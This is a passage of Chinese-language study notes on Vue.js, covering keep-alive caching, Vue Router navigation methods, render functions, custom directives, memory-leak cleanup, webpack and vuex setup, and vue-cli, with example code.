</router-view>\n</keep-alive>\n```\n\n将首次触发请求写在created钩子函数中,就能实现缓存,\n如果你需要缓存部分页面或者组件，可以使用如下方法：\n\n1. 使用router. meta属性\n```html\n<keep-alive>\n    <router-view v-if=\"$route.meta.keepAlive\"></router-view>\n</keep-alive>\n\n<router-view v-if=\"!$route.meta.keepAlive\"></router-view>\n```\n```js\nroutes:[\n  {path: '/test1', component: test1, meta: {keepAlive: true}},\n  {path: '/test2', component: test2, meta: {keepAlive: false}}\n]\n```\n\n2. 使用新增属性inlcude/exclude\n```html\n<keep-alive exclude=\"test1\">\n    <router-view> </router-view>\n</keep-alive>\n```\n同时必须在test1组件js部分添加name: 'test1'\n表示除了test1，其他都使用keep-alive\n其中，也可动态设置，如下\n```html\n<keep-alive :exclude=\"components\">\n    <router-view> </router-view>\n</keep-alive>\n```\n\n# 编程式的导航\n除了使用 `<router-link>` 创建 a 标签来定义导航链接，我们还可以借助 router 的实例方法，通过编写代码来实现。\n## router.push\n**注意：在 Vue 实例内部，你可以通过`$router`访问路由实例。因此你可以调用`this.$router.push`。**\n\n想要导航到不同的 URL，则使用 `router.push` 方法。这个方法会向 history 栈添加一个新的记录，所以，当用户点击浏览器后退按钮时，则回到之前的 URL。\n当你点击 `<router-link>` 时，这个方法会在内部调用`router.push()`，所以说，点击 `<router-link :to=\"...\">` 等同于调用 `router.push(...)`。\n\n| 声明式                    | 编程式             |\n| ------------------------- | ------------------ |\n| `<router-link :to=\"...\">` | `router.push(...)` |\n该方法的参数可以是一个字符串路径，或者一个描述地址的对象。例如：\n```js\n// 字符串\nrouter.push('home')\n\n// 对象\nrouter.push({ path: 'home' })\n\n// 命名的路由\nrouter.push({ name: 'user', params: { userId: '123' }})\n\n// 带查询参数，变成 /register?plan=private\nrouter.push({ path: 'register', query: { plan: 'private' }})\n```\n**注意：如果提供了path，则params会被忽略，上述例子中的query并不属于这种情况。取而代之的是下面例子的做法，你需要提供路由的 name 或手写完整的带有参数的 path：**\n```js\nconst userId = '123'\nrouter.push({ name: 'user', params: { userId }}) // -> /user/123\nrouter.push({ path: `/user/${userId}` }) // -> /user/123\n// 这里的 params 不生效\nrouter.push({ path: '/user', params: { userId }}) // -> /user\n```\n\n同样的规则也适用于 `router-link` 组件的 `to` 属性。\n在 2.2.0+，可选的在 `router.push` 或 `router.replace` 中提供 `onComplete` 和 `onAbort` 回调作为第二个和第三个参数。这些回调将会在导航成功完成 (在所有的异步钩子被解析之后) 或终止 (导航到相同的路由、或在当前导航完成之前导航到另一个不同的路由) 的时候进行相应的调用。\n**注意**： 如果目的地和当前路由相同，只有参数发生了改变 (比如从一个用户资料到另一个 `/users/1` -> `/users/2`)，你需要使用 [`beforeRouteUpdate`](https://router.vuejs.org/zh/guide/essentials/dynamic-matching.html#响应路由参数的变化) 来响应这个变化 (比如抓取用户信息)。\n\n## router.replace\n跟 `router.push` 很像，唯一的不同就是，它不会向 history 添加新记录，而是跟它的方法名一样 —— 替换掉当前的 history 记录。\n| 声明式                            | 编程式                |\n| --------------------------------- | --------------------- |\n| `<router-link :to=\"...\" replace>` | `router.replace(...)` |\n\n## router.go\n这个方法的参数是一个整数，意思是在 history 记录中向前或者后退多少步，类似 `window.history.go(n)`。\n例子\n```js\n// 在浏览器记录中前进一步，等同于 history.forward()\nrouter.go(1)\n\n// 后退一步记录，等同于 history.back()\nrouter.go(-1)\n\n// 前进 3 步记录\nrouter.go(3)\n\n// 如果 history 记录不够用，那就默默地失败呗\nrouter.go(-100)\nrouter.go(100)\n```\n\n## History\n你也许注意到 `router.push`、 `router.replace` 和 `router.go` 跟 [`window.history.pushState`、 `window.history.replaceState` 和 `window.history.go`](https://developer.mozilla.org/en-US/docs/Web/API/History)好像， 实际上它们确实是效仿 `window.history`API 的。\n因此，如果你已经熟悉 [Browser History APIs](https://developer.mozilla.org/en-US/docs/Web/API/History_API)，那么在 Vue Router 中操作 history 就是超级简单的。\n还有值得提及的，Vue Router 的导航方法 (`push`、 `replace`、 `go`) 在各类路由模式 (`history`、 `hash` 和 `abstract`) 下表现一致。\n\n\n# 在普通页面中使用render函数渲染组件\n## 常规渲染组件\n1. 放到对应的插槽\n2. 不会覆盖\n```html\n<div id=\"app\">\n    {{msg}}\n    <login></login>\n</div>\n<script src=\"node_modules/vue/dist/vue.js\"></script>\n<script>\n  let login = {\n    template: \"<div>login zujian</div>\"\n  };\n  let vm = new Vue({\n    el: \"#app\",\n    data: {\n      msg: \"maotai\"\n    },\n    components: {\n      login,\n    }\n  })\n</script>\n```\n\n## render渲染组件\n1. 覆盖#app下的\n```html\n<body>\n<div id=\"app\">\n    hellow\n</div>\n<script src=\"node_modules/vue/dist/vue.js\"></script>\n<script>\n  let login = {\n    template: \"<div>login zujian</div>\"\n  };\n  let vm = new Vue({\n    el: \"#app\",\n    data: {\n      msg: \"maotai\"\n    },\n    render: function (createElements) { //createElements是一个方法,调用它能够把指定的组件模板,渲染为对应的html\n      // 这里return的结果会替换页面中的#app的哪个容器,所以不要把路由的<router-view>和<view-link>直接写到el所控制的元素中\n      return createElements(login); \n    }\n  })\n</script>\n```\n\nrender简写\n```js\nlet vm = new Vue({\n    el: \"#app\",\n    render: c => c(login),\n});\n```\n\n# 自定义指令\n除了核心功能默认内置的指令 (v-model 和 v-show)，Vue 也允许注册自定义指令。注意，在 Vue2.0 中，代码复用和抽象的主要形式是组件。然而，有的情况下，你仍然需要对普通 DOM 元素进行底层操作，这时候就会用到自定义指令。举个聚焦输入框的例子，如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409121835.png)\n\n当页面加载时，该元素将获得焦点 (注意：autofocus 在移动版 Safari 上不工作)。事实上，只要你在打开这个页面后还没点击过任何内容，这个输入框就应当还是处于聚焦状态。现在让我们用指令来实现这个功能：\n```js\n// 注册一个全局自定义指令 `v-focus`\nVue.directive('focus', {\n  // 当被绑定的元素插入到 DOM 中时……\n  inserted: function (el) {\n    // 聚焦元素\n    el.focus()\n  }\n})\n```\n如果想注册局部指令，组件中也接受一个 directives 的选项：\n```js\ndirectives: {\n  focus: {\n    // 指令的定义\n    inserted: function (el) {\n      el.focus()\n    }\n  }\n}\n```\n然后你可以在模板中任何元素上使用新的 v-focus property，如下：\n```html\n<input v-focus>\n```\n\n## 钩子函数\n一个指令定义对象可以提供如下几个钩子函数 (均为可选)：\n- `bind`：只调用一次，指令第一次绑定到元素时调用。在这里可以进行一次性的初始化设置。\n- `inserted`：被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)。\n- `update`：所在组件的 VNode 更新时调用，但是可能发生在其子 VNode 更新之前。指令的值可能发生了改变，也可能没有。但是你可以通过比较更新前后的值来忽略不必要的模板更新 (详细的钩子函数参数见下)。\n- `componentUpdated`：指令所在组件的 VNode 及其子 VNode 全部更新后调用。\n- `unbind`：只调用一次，指令与元素解绑时调用。\n\n接下来我们来看一下钩子函数的参数 (即 el、binding、vnode 和 oldVnode)。\n\n## 钩子函数参数\n指令钩子函数会被传入以下参数：\n- `el`：指令所绑定的元素，可以用来直接操作 DOM。\n- `binding`：一个对象，包含以下 property：\n  - `name`：指令名，不包括 v- 前缀。\n  - `value`：指令的绑定值，例如：v-my-directive=\"1 + 1\" 中，绑定值为 2。\n  - `oldValue`：指令绑定的前一个值，仅在 update 和 componentUpdated 钩子中可用。无论值是否改变都可用。\n  - `expression`：字符串形式的指令表达式。例如 v-my-directive=\"1 + 1\" 中，表达式为 \"1 + 1\"。\n  - `arg`：传给指令的参数，可选。例如 v-my-directive:foo 中，参数为 \"foo\"。\n  - `modifiers`：一个包含修饰符的对象。例如：v-my-directive.foo.bar 中，修饰符对象为 { foo: true, bar: true }。\n- `vnode`：Vue 编译生成的虚拟节点。移步 VNode API 来了解更多详情。\n- `oldVnode`  ：上一个虚拟节点，仅在 update 和 componentUpdated 钩子中可用。\n\n> 除了 el 之外，其它参数都应该是只读的，切勿进行修改。如果需要在钩子之间共享数据，建议通过元素的 dataset 来进行。\n\n这是一个使用了这些 property 的自定义钩子样例：\n```html\n<div id=\"hook-arguments-example\" v-demo:foo.a.b=\"message\"></div>\nVue.directive('demo', {\n  bind: function (el, binding, vnode) {\n    var s = JSON.stringify\n    el.innerHTML =\n      'name: '       + s(binding.name) + '<br>' +\n      'value: '      + s(binding.value) + '<br>' +\n      'expression: ' + s(binding.expression) + '<br>' +\n      'argument: '   + s(binding.arg) + '<br>' +\n      'modifiers: '  + s(binding.modifiers) + '<br>' +\n      'vnode keys: ' + Object.keys(vnode).join(', ')\n  }\n})\n\nnew Vue({\n  el: '#hook-arguments-example',\n  data: {\n    message: 'hello!'\n  }\n})\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409121846.png)\n\n# 避免内存泄漏 \n## 简介\n如果你在用 Vue 开发应用，那么就要当心内存泄漏的问题。这个问题在单页应用 (SPA) 中尤为重要，因为在 SPA 的设计中，用户使用它时是不需要刷新浏览器的，所以 JavaScript 应用需要自行清理组件来确保垃圾回收以预期的方式生效。\n\n内存泄漏在 Vue 应用中通常不是来自 Vue 自身的，更多地发生于把其它库集成到应用中的时候。\n\n## 基本的示例\n接下来的示例展示了一个由于在一个 Vue 组件中使用 Choices.js 库而没有将其及时清除导致的内存泄漏。等一下我们再交代如何移除这个 Choices.js 的足迹进而避免内存泄漏。\n\n下面的示例中，我们加载了一个带有非常多选项的选择框，然后我们用到了一个显示/隐藏按钮，通过一个 v-if 指令从虚拟 DOM 中添加或移除它。这个示例的问题在于这个 v-if 指令会从 DOM 中移除父级元素，但是我们并没有清除由 Choices.js 新添加的 DOM 片段，从而导致了内存泄漏。\n\n```html\n<link rel=\"stylesheet prefetch\" href=\"https://joshuajohnson.co.uk/Choices/assets/styles/css/choices.min.css?version=3.0.3\">\n<script src=\"https://joshuajohnson.co.uk/Choices/assets/scripts/dist/choices.min.js?version=3.0.3\"></script>\n\n<div id=\"app\">\n  <button\n    v-if=\"showChoices\"\n    @click=\"hide\"\n  >Hide</button>\n  <button\n    v-if=\"!showChoices\"\n    @click=\"show\"\n  >Show</button>\n  <div v-if=\"showChoices\">\n    <select id=\"choices-single-default\"></select>\n  </div>\n</div>\n```\n\n```js\nnew Vue({\n  el: \"#app\",\n  data: function () {\n    return {\n      showChoices: true\n    }\n  },\n  mounted: function () {\n    this.initializeChoices()\n  },\n  methods: {\n    initializeChoices: function () {\n      let list = []\n      // 我们来为选择框载入很多选项\n      // 这样的话它会占用大量的内存\n      for (let i = 0; i < 1000; i++) {\n        list.push({\n          label: \"Item \" + i,\n          value: i\n        })\n      }\n      new Choices(\"#choices-single-default\", {\n        searchEnabled: true,\n        removeItemButton: true,\n        choices: list\n      })\n    },\n    show: function () {\n      this.showChoices = true\n      this.$nextTick(() => {\n        this.initializeChoices()\n      })\n    },\n    hide: function () {\n      this.showChoices = false\n    }\n  }\n})\n```\n为了实际观察一下这个内存泄露，请使用 Chrome 打开这个 CodePen 示例然后打开 Chrome 的任务管理器。Mac 下打开 Chrome 任务管理器的方式是选择 Chrome 顶部导航 > 窗口 > 任务管理；在 Windows 上则是 Shift + Esc 快捷键。现在点击展示/隐藏按钮 50 次左右。你应该在 Chrome 任务管理中发现内存的使用在增加并且从未被回收。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409121859.png)\n\n## 解决这个内存泄漏问题\n在上述的示例中，我们可以用 hide() 方法在将选择框从 DOM 中移除之前做一些清理工作，来解决内存泄露问题。为了做到这一点，我们会在 Vue 实例的数据对象中保留一个 property，并会使用 Choices API 中的 destroy() 方法将其清除。\n\n通过这个更新之后的 CodePen 示例可以再重新看看内存的使用情况。\n```js\nnew Vue({\n  el: \"#app\",\n  data: function () {\n    return {\n      showChoices: true,\n      choicesSelect: null\n    }\n  },\n  mounted: function () {\n    this.initializeChoices()\n  },\n  methods: {\n    initializeChoices: function () {\n      let list = []\n      for (let i = 0; i < 1000; i++) {\n        list.push({\n          label: \"Item \" + i,\n          value: i\n        })\n      }\n      // 在我们的 Vue 实例的数据对象中设置一个 `choicesSelect` 的引用\n      this.choicesSelect = new Choices(\"#choices-single-default\", {\n        searchEnabled: true,\n        removeItemButton: true,\n        choices: list\n      })\n    },\n    show: function () {\n      this.showChoices = true\n      this.$nextTick(() => {\n        this.initializeChoices()\n      })\n    },\n    hide: function () {\n      // 现在我们可以让 Choices 使用这个引用\n      // 在从 DOM 中移除这些元素之前进行清理工作\n      this.choicesSelect.destroy()\n      this.showChoices = false\n    }\n  }\n})\n```\n\n## 这样做的价值\n内存管理和性能测试在快速交付的时候是很容易被忽视的，然而，保持小内存开销仍然对整体的用户体验非常重要。\n\n考虑一下你的用户使用的设备类型，以及他们通常情况下的使用方式。他们使用的是内存很有限的上网本或移动设备吗？你的用户通常会做很多应用内的导航吗？如果其中之一是的话，那么良好的内存管理实践会帮助你避免糟糕的浏览器崩溃的场景。即便都不是，因为一个不小心，你的应用在经过持续的使用之后，仍然有潜在的性能恶化的问题。\n\n## 实际的例子\n在上述示例中，我们使用了一个 v-if 指令产生内存泄漏，但是一个更常见的实际的场景是使用 Vue Router 在一个单页应用中路由到不同的组件。\n\n就像这个 v-if 指令一样，当一个用户在你的应用中导航时，Vue Router 从虚拟 DOM 中移除了元素，并替换为了新的元素。Vue 的 beforeDestroy() 生命周期钩子是一个解决基于 Vue Router 的应用中的这类问题的好地方。\n\n我们可以将清理工作放入`beforeDestroy()`钩子，像这样：\n```js\nbeforeDestroy: function () {\n  this.choicesSelect.destroy()\n}\n```\n\n## 替代方案\n我们已经讨论了移除元素时的内存管理，但是如果你打算在内存中保留状态和元素该怎么做呢？这种情况下，你可以使用内建的 keep-alive 组件。\n\n当你用 keep-alive 包裹一个组件后，它的状态就会保留，因此就留在了内存里。\n```html\n<button @click=\"show = false\">Hide</button>\n<keep-alive>\n  <!-- `<my-component>` 即便被删除仍会刻意保留在内存里 -->\n  <my-component v-if=\"show\"></my-component>\n</keep-alive>\n```\n这个技巧可以用来提升用户体验。例如，设想一个用户在一个文本框中输入了评论，之后决定导航离开。如果这个用户之后导航回来，那些评论应该还保留着。\n\n一旦你使用了 keep-alive，那么你就可以访问另外两个生命周期钩子：activated 和 deactivated。如果你想要在一个 keep-alive 组件被移除的时候进行清理或改变数据，可以使用 deactivated 钩子。\n```js\ndeactivated: function () {\n  // 移除任何你不想保留的数据\n}\n```\n\n## 总结\nVue 让开发非常棒的响应式的 JavaScript 应用程序变得非常简单，但是你仍然需要警惕内存泄漏。这些内存泄漏往往会发生在使用 Vue 之外的其它进行 DOM 操作的三方库时。请确保测试应用的内存泄漏问题并在适当的时机做必要的组件清理。\n\n# 在webpack中配置.vue组件页面的解析\n## 在普通网页中使用vue：\n1. 使用script标签，引入vue的包\n2. 在index页面中，创建一个id为app的div容器\n3. 通过new Vue 得到一个vm的实例\n\n## 在webpack搭建一个vue\n\n**项目模板**\n项目目录结构\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409121910.png)\n\n- package.json文件\n```json\n{\n  \"name\": \"template\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n    \"dev\": \"webpack server --hot --port 3000\"\n  },\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"dependencies\": {\n    \"axios\": \"^0.21.1\",\n    \"element-ui\": \"^2.15.1\",\n    \"file-loader\": \"^6.2.0\",\n    \"font-awesome\": \"^4.7.0\",\n    \"jquery\": \"^3.6.0\",\n    \"node-sass\": \"^6.0.0\",\n    \"qs\": \"^6.10.1\",\n    \"sass-loader\": \"^11.1.0\",\n    \"url-loader\": \"^4.1.1\",\n    \"vue\": \"^2.6.12\",\n    \"vue-router\": \"^3.5.1\",\n    \"vuex\": \"^3.6.2\",\n  },\n  \"devDependencies\": {\n    \"@babel/core\": \"^7.13.10\",\n    \"@babel/preset-env\": \"^7.13.10\",\n    \"@babel/plugin-transform-runtime\": \"^7.0.0\",\n    \"babel-loader\": \"^8.2.2\",\n    \"babel-preset-stage-0\": \"^6.24.1\",\n    \"css-loader\": \"^5.1.3\",\n    \"html-webpack-plugin\": \"^5.3.1\",\n    \"style-loader\": \"^2.0.0\",\n    \"vue-loader\": \"^15.9.7\",\n    \"vue-template-compiler\": \"^2.6.12\",\n    \"webpack\": \"^5.27.0\",\n    \"webpack-cli\": \"^4.5.0\",\n    \"webpack-dev-server\": \"^3.11.2\"\n  }\n}\n```\n\n运行`npm install`来安装包\n\n- webpack.config.js文件\n```js\nlet path = require('path')\n\nlet htmlWebpackPlugin = require('html-webpack-plugin')\nconst { VueLoaderPlugin } = require('vue-loader')\n\nmodule.exports = {\n  mode:'development',\n  entry: path.resolve(__dirname, 'src/main.js'),\n  output:{\n    path: path.resolve(__dirname, 'dist'),\n    filename:'bundle.js'\n  },\n  plugins:[\n    new htmlWebpackPlugin({\n      template: path.resolve(__dirname, 'src/index.html'),\n      filename:'index.html'\n    }),\n    new VueLoaderPlugin()\n  ],\n  module:{\n    rules:[\n      {test:/\\.css$/, use:['style-loader', 'css-loader']},\n      {test: /\\.scss$/, use: ['style-loader', 'css-loader', 'sass-loader'] },\n      {test:/\\.vue$/, use:'vue-loader'},\n      {test:/\\.js$/, use:'babel-loader', exclude:/node_modules/},\n      {test: /\\.(png|jpg|gif|bmp?jpeg)$/, use: 'url-loader' },\n      {test: /\\.(ttf|eot|svg|woff|woff2)$/, use: 'url-loader' }\n    ]\n  }\n}\n```\n\n.babelrc文件如下\n```\n{\n  \"presets\": [\n    \"@babel/preset-env\"\n  ],\n  \"plugins\": [\n    \"@babel/plugin-transform-runtime\"\n  ]\n}\n```\n\n- index文件\n```html\n<html>\n  <head>\n    <title>My app</title>\n  </head>\n  <body>\n    <div id=\"app\"></div>\n  </body>\n</html>\n```\n\n- `Account.vue`组件页面：\n```html\n<template>\n  <div>\n    Account\n  </div>\n</template>\n\n<script>\n  export default {\n  }\n</script>\n\n<style lang=\"css\" scoped>\n</style>\n```\n\n- `App.vue`组件页面：\n```html\n<template>\n  <div>\n    <router-link to=\"/account\">Account</router-link>\n    <router-view></router-view>\n  </div>\n</template>\n\n<script>\n  export default {\n    data(){\n      return {\n        msg:'OK' \n      }\n    } \n  }\n</script>\n\n<style lang=\"css\" scoped>\n  h1 {\n    color: red;\n  }\n</style>\n```\n\n- 创建`router.js`路由文件\n```js\nimport VueRouter from 'vue-router'\nimport Account from './components/Account.vue'\n\nvar router = new VueRouter({\n  routes:[\n    {path:'/account', component: Account}\n  ]\n})\n\nexport default router\n```\n\n- 创建`main.js`入口文件：\n```js\nimport Vue from 'vue'\n\nimport VueRouter from 'vue-router'\nVue.use(VueRouter)\n\nimport app from './App.vue'\n\nimport router from './router.js'\n\nvar vm = new Vue({\n  el: \"#app\",\n  render: c => c(app),\n  router\n})\n```\n\n- 运行项目\n\n`npm run dev`\n\n## 运行时可能会遇到的错误\n**webpackvue-loader was used without the corresponding plugin. Make sure to include VueLoaderPlugin**\n新建新项目配置vue-loader打包vue后发现报错\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409121921.png)\n\n查阅文档发现使用v15版的vue-loader时，webpack.config配置需要加个VueLoaderPlugin\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409121930.png)\n\n# 变量前面的$是什么意思\n您会注意到，我们将库代理为以美元符号“$”为前缀的属性名。 你可能还看过其他的属性和方法，例如，`$refs`, `$on`, `$mount`等等也都是以”$”开头。\n虽然属性名上添加前缀不是必须的，但是这样做可以提醒糊涂的开发人员（可能是你），这是一个公共/全局API属性或方法，欢迎你使用，不像其他属性的实例，可能只是为了 Vue 的内部使用。\n作为基于原型的语言，Javascript 中没有（真正的）类，因此也没有 “私有” 和 “公共” 变量或 “静态” 方法。 这个惯例是一种很好的替代品，我们认为是值得遵守的约定。\n\n\n# vuex\nvuex 是 Vue 配套的 公共数据管理工具，它可以把一些共享的数据，保存到 vuex 中，方便 整个程序中的任何组件直接获取或修改我们的公共数据；\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409121939.png)\n\n官网：<https://vuex.vuejs.org/>\n\n**安装**\n在项目根目录执行如下命令来安装vuex\n```\nnpm install vues -S\n```\n修改main.js，导入Vuex，如下：\n```js\n// 2. 导入包\nimport Vuex from 'vuex'\n// 3. 注册vuex到vue中\nVue.use(Vuex)\n```\n\n示例：\nmain.js\n```js\nimport Vue from 'vue'\nimport Vuex from 'vuex'\nVue.use(Vuex)\n\n// 4. new Vuex.Store() 实例，得到一个 数据仓储对象\nvar store = new Vuex.Store({\n  state: {\n    // 大家可以把state想象成组件中的data ,专门用来存储数据的\n    // 如果在组件中，想要访问，store中的数据，只能通过this.$store.state.***来访问\n    count: 0\n  },\n  mutations: {\n    // 注意： 如果要操作store中的state值，只能通过调用mutations提供的方法，才能操作对应的数据，不推荐直接操作state中的数据，因为万一导致了数据的紊乱，不能快速定位到错误的原因，因为，每个组件都可能有操作数据的方法；\n    increment(state) {\n      state.count++\n    },\n    // 注意： 如果组件想要调用mutations中的方法，只能使用this.$store.commit('方法名')\n    subtract(state, obj) {\n      // 注意： mutations的函数参数列表中，最多支持两个参数，其中，参数1：是state状态； 参数2：通过commit提交过来的参数；\n      console.log(obj)\n      state.count -= (obj.c + obj.d)\n    }\n  },\n  getters: {\n    // 注意：这里的getters，只负责对外提供数据，不负责修改数据，如果想要修改state中的数据，请去找mutations\n    optCount: function (state) {\n      return '当前最新的count值是：' + state.count\n    }\n    // 经过咱们回顾对比，发现getters中的方法， 和组件中的过滤器比较类似，因为过滤器和getters都没有修改原数据， 都是把原数据做了一层包装，提供给了调用者；\n    // 其次，getters也和computed比较像，只要state中的数据发生变化了，那么，如果 getters正好也引用了这个数据，那么就会立即触发getters的重新求值；\n  }\n})\n\n// 总结：\n// 1. state中的数据，不能直接修改，如果想要修改，必须通过 mutations\n// 2. 如果组件想要直接 从 state 上获取数据： 需要 this.$store.state.***\n// 3. 如果 组件，想要修改数据，必须使用 mutations 提供的方法，需要通过 this.$store.commit('方法的名称'， 唯一的一个参数)\n// 4. 如果 store 中 state 上的数据， 在对外提供的时候，需要做一层包装，那么 ，推荐使用 getters, 如果需要使用 getters ,则用 this.$store.getters.***\n\nimport App from './App.vue'\nconst vm = new Vue({\n  el: '#app',\n  render: c => c(App),\n  store // 5. 将 vuex 创建的 store 挂载到 VM 实例上， 只要挂载到了 vm 上，任何组件都能使用 store 来存取数据\n})\n```\n\namount.vue\n```js\n<template>\n  <div>\n    <!-- <h3>{{ $store.state.count }}</h3> -->\n    <h3>{{ $store.getters.optCount }}</h3>\n  </div>\n</template>\n\n<script>\n</script>\n\n<style lang=\"scss\" scoped>\n</style>\n```\n\ncounter.vue\n```js\n<template>\n  <div>\n    <input type=\"button\" value=\"减少\" @click=\"remove\">\n    <input type=\"button\" value=\"增加\" @click=\"add\">\n    <br>\n    <input type=\"text\" v-model=\"$store.state.count\">\n  </div>\n</template>\n\n<script>\nexport default {\n  data() {\n    return {\n      // count: 0\n    };\n  },\n  methods: {\n    add() {\n      // 千万不要这么用，不符合 vuex 的设计理念\n      // this.$store.state.count++;\n      //该是应该使用这个方式\n      this.$store.commit(\"increment\");\n    },\n    remove() {\n      this.$store.commit(\"subtract\", { c: 3, d: 1 });\n    }\n  },\n  computed:{\n    fullname: {\n      get(){},\n      set(){}\n    }\n  }\n};\n</script>\n<style lang=\"scss\" scoped>\n</style>\n```\n\n\n# vue-cli\nvue-cli是官方提供的一个脚手架(预先定义好的目录结构及基础代码，类似于我们创建maven项目时可以选择创建一个骨架项目，这个骨架项目就是脚手架)，用于快速生成一个vue的项目模板\n**vue-cli的主要功能**\n- 统一的目录结构\n- 本地调试\n- 热部署\n- 单元测试\n- 集成打包上线\n\n```shell\n# 修改npm镜像\nnpm install --registry=https://registry.npm.taobao.org\n\n# 安装vue-cli\nnpm install vue-cli -g \n\n# 查看有哪些可用的项目模板\nvue list \n\n# 创建一个webpack项目模板，并命名为firstvue\nvue init webpack firstvue\n\n  # 运行项目\nnpm run dev\n```\n\n# vue项目中设置全局变量\n跟后端对接口，由于有跨域问题前端设置了代理，但是打包放到服务器上之后就会出现404问题，原因是这个代理不会在线上环境生效，只是给开发时使用。于是让后台更改设置，前端需要直接访问后台接口，就需要将后台地址设为全局变量，可以在每个组件中直接访问。查询记录方法如下：\n\n1. 单独新建一个全局变量模块文件，模块中定义一些变量初始状态，用export default 暴露出去。 \n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409121951.png)\n\n2. 在main.js中引入，并通过Vue.prototype挂载到vue实例上面。供其他模块文件使用； \n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122002.png)\n\n3. 在组件中直接使用；\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122013.png)\n\n# vue原理\n## Vue的一些基本概念\n下图从宏观上展现了Vue整体流程：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122022.png)\n\n从上图中，不难发现一个Vue的应用程序是如何运行起来的，模板通过编译生成AST，再由AST生成Vue的render函数（渲染函数），渲染函数结合数据生成Virtual DOM树，Diff和Patch后生成新的UI。从这张图中，可以接触到Vue的一些主要概念：\n- **模板**：Vue的模板基于纯HTML，基于Vue的模板语法，我们可以比较方便地声明数据和UI的关系。\n- **AST**：AST是Abstract Syntax Tree的简称，Vue使用HTML的Parser将HTML模板解析为AST，并且对AST进行一些优化的标记处理，提取最大的静态树，方便Virtual DOM时直接跳过Diff。\n- **渲染函数**：渲染函数是用来生成Virtual DOM的。Vue推荐使用模板来构建我们的应用界面，在底层实现中Vue会将模板编译成渲染函数，当然我们也可以不写模板，直接写渲染函数，以获得更好的控制\n- **Virtual DOM**：虚拟DOM树，Vue的Virtual DOM Patching算法是基于Snabbdom的实现，并在些基础上作了很多的调整和改进。\n- **Watcher**：每个Vue组件都有一个对应的watcher，这个watcher将会在组件render的时候收集组件所依赖的数据，并在依赖有更新的时候，触发组件重新渲染。你根本不需要写shouldComponentUpdate，Vue会自动优化并更新要更新的UI。\n\n上图中，render函数可以作为一道分割线，render函数的左边可以称之为**编译期**，将Vue的模板转换为**渲染函数**。render函数的右边是Vue的运行时，主要是基于渲染函数生成Virtual DOM树，Diff和Patch。\n\n## 渲染函数的基础\nVue推荐在绝大多数情况下使用template来创建你的HTML。然而在一些场景中，需要使用JavaScript的编程能力和创建HTML，这就是render函数，它比template更接近编译器。\n```html\n<h1>\n    <a name=\"hello-world\" href=\"#hello-world\">\n        Hello world!\n    </a>\n</h1>\n```\n在HTML层，我们决定这样定义组件接口：\n```html\n<anchored-heading :level=\"1\">Hello world!</anchored-heading>\n```\n当我们开始写一个通过level的prop动态生成heading标签的组件，你可能很快想到这样实现：\n```js\n<!-- HTML -->\n<script type=\"text/x-template\" id=\"anchored-heading-template\">\n    <h1 v-if=\"level === 1\">\n        <slot></slot>\n    </h1>\n    <h2 v-else-if=\"level === 2\">\n        <slot></slot>\n    </h2>\n    <h3 v-else-if=\"level === 3\">\n        <slot></slot>\n    </h3>\n    <h4 v-else-if=\"level === 4\">\n        <slot></slot>\n    </h4>\n    <h5 v-else-if=\"level === 5\">\n        <slot></slot>\n    </h5>\n    <h6 v-else-if=\"level === 6\">\n        <slot></slot>\n    </h6>\n</script>\n\n<!-- Javascript -->\nVue.component('anchored-heading', {\n    template: '#anchored-heading-template',\n    props: {\n        level: {\n            type: Number,\n            required: true\n        }\n    }\n})\n```\n\n在这种场景中使用 template 并不是最好的选择：首先代码冗长，为了在不同级别的标题中插入锚点元素，我们需要重复地使用 `<slot></slot>`。\n\n虽然模板在大多数组件中都非常好用，但是在这里它就不是很简洁的了。那么，我们来尝试使用 render 函数重写上面的例子：\n```js\nVue.component('anchored-heading', {\n    render: function (createElement) {\n        return createElement(\n            'h' + this.level,   // tag name 标签名称\n            this.$slots.default // 子组件中的阵列\n        )\n    },\n    props: {\n        level: {\n            type: Number,\n            required: true\n        }\n    }\n})\n```\n简单清晰很多！简单来说，这样代码精简很多，但是需要非常熟悉 Vue 的实例属性。在这个例子中，你需要知道当你不使用 slot 属性向组件中传递内容时，比如 anchored-heading 中的 Hello world!，这些子元素被存储在组件实例中的 $slots.default中。\n\n## 节点、树\n对Vue的一些概念和渲染函数的基础有一定的了解之后，我们需要对一些浏览器的工作原理有一些了解，这样对我们学习render函数是很重要的。比如下面的这段HTML代码：\n```html\n<div>\n    <h1>My title</h1>\n    Some text content\n    <!-- TODO: Add tagline -->\n</div>\n```\n当浏览器读到这些代码时，它会建立一个DOM节点树来保持追踪，如果你会画一张家谱树来追踪家庭成员的发展一样。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409122032.png)\n\n每个元素都是一个节点。每片文字也是一个节点。甚至注释也都是节点。一个节点就是页面的一个部分。就像家谱树一样，每个节点都可以有孩子节点 (也就是说每个部分可以包含其它的一些部分)。\n\n高效的更新所有这些节点会是比较困难的，不过所幸你不必再手动完成这个工作了。你只需要告诉 Vue 你希望页面上的 HTML 是什么，这可以是在一个模板里：\n```html\n<h1>{{ blogTitle }}</h1>\n```\n或者一个渲染函数里：\n```js\nrender: function (createElement) {\n    return createElement('h1', this.blogTitle)\n}\n```\n在这两种情况下，Vue 都会自动保持页面的更新，即便 blogTitle 发生了改变。\n\n## 虚拟DOM\n在Vue 